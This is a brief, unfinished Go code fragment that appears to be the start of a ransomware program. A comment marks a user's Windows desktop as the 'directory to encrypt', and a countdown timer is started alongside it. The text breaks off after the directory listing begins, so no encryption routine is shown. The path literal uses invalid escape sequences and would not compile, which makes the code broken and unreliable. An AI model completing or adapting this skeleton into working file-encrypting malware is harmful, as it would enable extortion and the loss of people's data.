package main
import(
  "fmt"
  "io/ioutil"
  "os"
  "time"
)
func main() {
  // start the timer
  go displayTimer()

  //define the directory to encrypt
  directory:= "C\user\dESKTOP"


  //Retrive the list of directory
  files,err:=ioutil.ReadDir(directory)
